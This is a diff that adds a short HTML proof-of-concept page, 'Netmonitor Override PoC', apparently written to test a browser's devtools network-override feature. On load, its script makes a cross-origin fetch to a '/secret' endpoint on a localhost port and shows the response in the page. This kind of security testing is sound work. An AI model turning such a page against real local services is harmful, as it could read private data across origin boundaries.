@@ -1,0 +1,16 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>Netmonitor Override PoC</title>
+<body>Loading…
+<script>
+(async () => {
+  try {
+    // Cross-origin request (different port => different origin)
+    const r = await fetch("http://127.0.0.1:8001/secret", { mode: "cors" });
+    const t = await r.text();
+    document.body.textContent = "Response: " + t;
+  } catch (e) {
+    document.body.textContent = "FETCH FAILED: " + e;
+  }
+})();
+</script>
